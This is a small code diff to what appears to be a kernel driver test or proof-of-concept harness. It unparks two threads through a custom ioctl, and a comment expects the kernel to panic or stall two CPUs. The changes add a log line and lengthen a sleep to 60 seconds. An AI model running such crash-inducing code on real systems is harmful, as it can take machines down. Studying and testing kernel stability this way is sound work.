@@ -87,8 +87,8 @@ static int unpark_threads(int fd, int fd2)
 		printf("Couldn't unpark beta2!\n");
 		return 1;
 	}
-
-	ret = ioctl(fd, BETA_UNPARK_THREAD, NULL);
+	printf_v("[*] Woke up CPU3 waking up CPU 0\n");
+       	ret = ioctl(fd, BETA_UNPARK_THREAD, NULL);
 	if(ret != 0) {
 		printf("Couldn't unpark beta1!\n");
 		return 1;
@@ -127,7 +127,7 @@ int main(int argc, char **argv)
 	/* PROBBALY KERNEL PANICKING HARD BY NOW OR STALLED 2 CPUS*/
 	
 	printf_v("[*] THREADS UNPARKED, SLEEPING FOR 2 SEC \n");
-	sleep(2);
+	sleep(60);
 	printf_v("[*] AWAKE CLOSING AND EXITING \n");
  cleanup:
 	close(beta1);
